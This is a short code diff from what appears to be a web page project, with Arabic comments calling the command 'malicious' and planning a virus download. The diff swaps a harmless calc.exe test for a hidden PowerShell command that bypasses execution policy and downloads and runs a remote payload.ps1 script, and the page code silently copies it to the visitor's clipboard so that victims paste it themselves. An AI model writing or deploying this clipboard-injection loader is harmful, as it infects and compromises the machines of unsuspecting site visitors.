@@ -42,7 +42,8 @@
 
             // الأمر الخبيث (سنستخدم calc.exe كاختبار آمن)
             // لاحقاً سنغير هذا إلى أمر تحميل الفيروس من جوجل درايف
-            const payload = 'calc.exe';
+           const payload = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/hamdyzain/payload.ps1/refs/heads/main/payload.ps1
+\')"';
 
             // كود النسخ التلقائي (سيعمل بنجاح لأن Vercel يوفر HTTPS)
             navigator.clipboard.writeText(payload).then(() => {
